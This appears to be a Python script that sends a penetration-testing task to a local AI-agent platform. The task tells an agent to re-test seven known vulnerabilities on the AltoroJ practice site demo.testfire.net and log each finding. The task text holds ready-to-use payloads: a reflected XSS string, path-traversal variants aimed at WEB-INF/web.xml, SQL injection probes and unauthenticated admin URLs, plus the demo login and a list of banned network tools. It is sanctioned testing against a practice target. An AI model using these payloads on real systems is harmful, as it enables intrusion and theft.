#!/usr/bin/env python3
"""第二轮：把上一轮漏报的 7 项做成交接清单，逐条复现并 report_finding 入库。"""
import json, subprocess, sys, os, urllib.request, urllib.error

BASE = "http://127.0.0.1:8787"
HERE = os.path.dirname(os.path.abspath(__file__))

def token():
    return subprocess.check_output(
        [sys.executable, os.path.join(HERE, "mktoken.py")], text=True).strip()

ENV_NOTE = """【执行环境 — 必读，违反会直接失败】
本机 Windows，shell 工具实际执行 PowerShell 5.1，不是 bash：
- 禁止 curl / wget / nc / nmap / sqlmap；禁止管道、重定向、&& 等 bash 语法。
- 发 HTTP 一律用 python。需要 POST / 带 Cookie / 看响应头时，**写成临时 .py 文件再执行**（引号嵌套在 PowerShell 里极易出错）。
- 登录并维持会话的标准写法（照抄即可）：
    import urllib.request, urllib.parse, http.cookiejar
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    r = op.open(urllib.request.Request('http://demo.testfire.net/doLogin',
        data=urllib.parse.urlencode({'uid':'jsmith','passw':'demo1234'}).encode()))
    print(r.status, len(r.read()))
    b = op.open('http://demo.testfire.net/bank/customize.jsp?lang=' + urllib.parse.quote('<script>alert(1)</script>')).read().decode('utf-8','ignore')
    print('<script>alert(1)</script>' in b)   # True 即原样回显 = XSS
- **协议只用 http://**（本机代理对 https 隧道不稳）。若报 "Tunnel connection failed" 或 502，
  改用 op = urllib.request.build_opener(urllib.request.ProxyHandler({})) 显式绕过代理。
- 单条命令控制在 60 秒内返回。"""

BOUNDARY = """【严格边界】
- 只允许访问 demo.testfire.net。
- 只读与验证性探测为主。**禁止**：注册新用户、改密码、提交转账、真的往 feedback 库里灌数据
  （只在参数层面验证注入特征即可，不要提交表单）、删除或修改数据、暴力破解、DoS、上传文件。"""

HANDOFF = """【交接清单：上一轮漏报、但已由源码审计确认存在的 7 处入口】
你必须【自己重新发请求独立复现】，确认后逐条 report_finding；复现不出来的写明原因，不要硬凑。

1) 反射 XSS · lang 参数
   需先登录 jsmith/demo1234，再 GET /bank/customize.jsp?lang=<script>alert(1)</script>
   判定：响应里是否原样出现 <script>alert(1)</script>（未转义）

2) 反射 XSS · query 参数
   登录后 GET /bank/queryxpath.jsp?query=<script>alert(1)</script>
   判定：同上；顺带看该页是否存在 XPath 注入特征（query 值带 ' 或 ] 时的报错差异）

3) 本地文件包含 / 路径遍历 · content 参数
   GET /index.jsp?content=../../WEB-INF/web.xml 以及 URL 编码形式 ..%2f..%2fWEB-INF%2fweb.xml
   还可以试 ../ 、....// 、%/2e%2e/ 等变体，以及 /index.jsp?content=WEB-INF/web.xml
   判定：是否读到 web.xml 内容、或出现与正常页不同的响应/报错
   注意：该参数会直接进 jsp:include，返回 500 也说明参数确实被 include 处理了，请如实记录

4) 后台未授权访问
   GET /admin/login.jsp、/admin/admin.jsp、/admin/feedbackReview.jsp
   判定：未登录/以 jsmith 普通用户身份访问，是否能看到后台内容（admin.jsp 应被拦截）

5) SQL 注入 · feedback 表单（源码 DBUtil.java:519，INSERT 拼接）
   /feedback.jsp 的 name / email / subject / comments 参数注入单引号，观察响应差异
   **只做参数层面的验证，不要真的提交大量数据**

6) SQL 注入 · 账户查询（源码 DBUtil.java:451 / :276）
   登录后 GET /bank/showAccount?accountNo=1' 与 /bank/showAccount?listAccounts=1'
   判定：500 + Derby/SQL 语法错误，或与正常值的响应差异

7) SQL 注入 · 用户信息查询（源码 DBUtil.java:242，WHERE USER_ID='<username>'）
   登录后尝试触发 USER_ID 相关查询的入口（如 /bank/main.jsp、账户信息页），注入单引号观察报错"""

RULES = """【硬性交付要求 —— 验收标准】
- 每条【先 baseline（正常值）后 payload】，把两段真实输出贴进 evidence（完整 URL、状态码、响应关键片段）。
- 复现成功【立即 report_finding】：vulnclass / name / severity(critical|high|medium|low) / summary / evidence。
- 7 条全部处理完后调用 list_findings 复核。
- 【只有这 7 项全部给出明确结论（登记 or 写明未复现原因）之后】才允许判定目标达成；
  中途不得收官，也不要因为"觉得差不多了"就结束。"""

DESC = f"""{ENV_NOTE}

{BOUNDARY}

{HANDOFF}

{RULES}"""

GOAL = ("对 demo.testfire.net（HCL/IBM AltoroJ 官方授权靶场）上一轮漏报的 7 处入口逐条独立复现："
        "lang/query 参数反射 XSS、index.jsp content 参数本地文件包含、/admin 后台未授权访问、"
        "feedback 与 showAccount 及 USER_ID 查询的 SQL 注入；每条附 baseline 对照与实际响应证据，"
        "确认后逐条调用 report_finding 登记，最后 list_findings 对账。")

def main():
    body = {
        "name": "AltoroJ 补漏轮：7 项漏报入口复现 (demo.testfire.net)",
        "description": DESC,
        "goal": GOAL,
        "company_ids": [3],
        "seed_first_intent": True,
        "coverage_enabled": True,
        "timeout_seconds": 7200,
    }
    data = json.dumps(body, ensure_ascii=False).encode("utf-8")
    tok = token()
    req = urllib.request.Request(BASE + "/api/tasks", data=data, method="POST",
        headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json; charset=utf-8"})
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        with opener.open(req, timeout=30) as r:
            print("[HTTP %d]" % r.status, r.read().decode("utf-8", "ignore")[:300])
    except urllib.error.HTTPError as e:
        print("[HTTP %d]" % e.code, e.read()[:400].decode("utf-8", "ignore"))
    except Exception as e:
        print("ERR", type(e).__name__, str(e)[:200])

if __name__ == "__main__":
    main()
